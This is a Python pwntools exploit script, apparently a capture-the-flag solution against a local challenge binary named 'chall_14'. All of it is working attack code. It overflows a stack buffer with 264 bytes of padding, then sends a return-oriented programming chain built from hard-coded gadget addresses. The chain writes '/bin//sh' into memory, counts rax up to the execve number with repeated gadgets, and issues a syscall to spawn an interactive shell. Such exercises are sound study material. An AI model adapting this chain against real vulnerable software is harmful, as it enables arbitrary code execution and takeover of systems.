from pwn import *
from struct import pack

# Padding goes here
r = b''

r += p64(0x000000000040f3fe) # pop rsi ; ret
r += p64(0x00000000004c00e0) # @ .data
r += p64(0x00000000004494a7) # pop rax ; ret
r += b'/bin//sh'
r += p64(0x000000000047b9c5) # mov qword ptr [rsi], rax ; ret
r += p64(0x000000000040f3fe) # pop rsi ; ret
r += p64(0x00000000004c00e8) # @ .data + 8
r += p64(0x0000000000443b00) # xor rax, rax ; ret
r += p64(0x000000000047b9c5) # mov qword ptr [rsi], rax ; ret
r += p64(0x00000000004018ca) # pop rdi ; ret
r += p64(0x00000000004c00e0) # @ .data
r += p64(0x000000000040f3fe) # pop rsi ; ret
r += p64(0x00000000004c00e8) # @ .data + 8
r += p64(0x00000000004017cf) # pop rdx ; ret
r += p64(0x00000000004c00e8) # @ .data + 8
r += p64(0x0000000000443b00) # xor rax, rax ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004709f0) # add rax, 1 ; ret
r += p64(0x00000000004012d3) # syscall

s= process("./chall_14")
payload = b's'*264+r
s.sendline(payload)
s.interactive()
s.close()
